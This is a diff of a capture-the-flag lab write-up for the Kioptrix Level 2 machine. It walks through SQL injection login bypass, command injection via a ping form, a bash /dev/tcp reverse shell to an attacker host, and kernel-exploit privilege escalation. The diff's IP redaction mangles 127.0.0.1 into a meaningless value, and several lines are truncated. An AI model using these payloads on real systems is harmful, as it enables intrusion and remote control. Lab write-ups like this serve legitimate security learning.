@@ -1,6 +1,6 @@
 # Kioptrix Level 2 – Writeup
 
-**Target:** Kioptrix Level 2 (192.168.74.3)
+**Target:** Kioptrix Level 2 (xxx.xxx.74.3)
 **Attacker:** Kali Linux in UTM
 **OS:** CentOS 4.5, Kernel 2.6.9-55.EL
 **Difficulty:** Easy
@@ -13,16 +13,16 @@
 Gotta find the box first. Ran a ping sweep across the network:
 
 ```bash
-export SCOPE=192.168.74.0/24
+export SCOPE=xxx.xxx.74.0/24
 nmap -sn $SCOPE
 ```
 
-Two hosts came up. 192.168.74.1 is just the gateway (UTM's virtual router, you can tell because the DHCP offer came from that IP during boot). 192.168.74.3 is our target.
+Two hosts came up. xxx.xxx.74.1 is just the gateway (UTM's virtual router, you can tell because the DHCP offer came from that IP during boot). xxx.xxx.74.3 is our target.
 
 Then a service scan to see what's running:
 
 ```bash
-export RHOST=192.168.74.3
+export RHOST=xxx.xxx.74.3
 nmap -sV $RHOST
 ```
 
@@ -53,7 +53,7 @@ SELECT * FROM users WHERE username='' OR 1=1 #' AND password='whatever'
 After the login there's a page that lets you ping an IP. Whenever you see something like that, first thing you try is sneaking in extra commands. Threw a pipe in there:
 
 ```
-127.0.0.1 | id
+xxx.x0.0.1 | id
 ```
 
 Worked. We're running as `apache`. The server just takes whatever you type, slaps it into a shell command, and runs it. No filtering, no sanitization, nothing.
@@ -69,10 +69,10 @@ nc -lvnp 4444
 Then in the ping field:
 
 ```
-127.0.0.1 | bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/4444 0>&1
+xxx.x0.0.1 | bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/4444 0>&1
 ```
 
-Quick breakdown of what that actually does. `127.0.0.1 |` pings localhost and the pipe sends the output to the next command. `bash -i` fires up an interactive shell. `>& /dev/tcp/IP/PORT` redirects both stdout and stderr over TCP to our Kali box. `0>&1` sends stdin through the same connection. End result is the target connects back to us with a full shell. That's why it's called a reverse shell, the target reaches out to us instead of us connecting to it.
+Quick breakdown of what that actually does. `xxx.x0.0.1 |` pings localhost and the pipe sends the output to the next command. `bash -i` fires up an interactive shell. `>& /dev/tcp/IP/PORT` redirect[...]
 
 ---
 
@@ -128,15 +128,15 @@ That's it. Root.
 
 I only went the web route this time (SQL injection into command injection into kernel exploit) but there's more stuff to poke at on this box.
 
-**MySQL on 3306** is open and could be worth connecting to directly. If it accepts remote connections with weak creds you could dump the database, grab password hashes, or even write files to disk.
+**MySQL on 3306** is open and could be worth connecting to directly. If it accepts remote connections with weak creds you could dump the database, grab password hashes, or even write files to dis[...]
 
 **SSH on 22** could be brute forced with hydra. Or if you get creds from the database dump you could just log in directly. Way cleaner than a reverse shell.
 
-**sqlmap** against the login form would be interesting too. Instead of just bypassing the login with `' OR 1=1 #` you could use sqlmap to fully enumerate the database, dump all tables, and extract creds.
+**sqlmap** against the login form would be interesting too. Instead of just bypassing the login with `' OR 1=1 #` you could use sqlmap to fully enumerate the database, dump all tables, and extrac[...]
 
 **gobuster** on the web server to find hidden directories and files. There might be admin panels, backup files, or other pages that aren't linked from the main site.
 
-**Other privilege escalation paths** besides the kernel exploit. Could check for SUID binaries with `find / -perm -4000`, look at cronjobs, check file permissions, or hunt for credentials in config files.
+**Other privilege escalation paths** besides the kernel exploit. Could check for SUID binaries with `find / -perm -4000`, look at cronjobs, check file permissions, or hunt for credentials in conf[...]
 
 Will come back and hit these when I get the chance.
 
@@ -148,10 +148,10 @@ SQL injection on login forms is still one of the easiest wins out there. `' OR 1
 
 Command injection shows up anywhere user input gets passed to system commands. Ping forms, DNS lookups, file upload handlers. If it interacts with the OS, try pipes and semicolons.
 
-Reverse shells make way more sense to me now. It's just redirecting stdin, stdout, and stderr over a TCP connection. The `>&` means "both stdout and stderr" and `0>&1` chains stdin into the same connection.
+Reverse shells make way more sense to me now. It's just redirecting stdin, stdout, and stderr over a TCP connection. The `>&` means "both stdout and stderr" and `0>&1` chains stdin into the same [...]
 
 Old kernels are free root. If you see a kernel version from 2006, searchsploit will almost certainly have something for it. Download, compile, run, done.
 
-Transferring files to a target is easiest with python's http server on your end and wget on the target. Just make sure you're running the server from the directory where the file actually is, otherwise wget gets a 404.
+Transferring files to a target is easiest with python's http server on your end and wget on the target. Just make sure you're running the server from the directory where the file actually is, oth[...]
 
 *Educational purposes only. Don't run any of this on systems you don't own.*
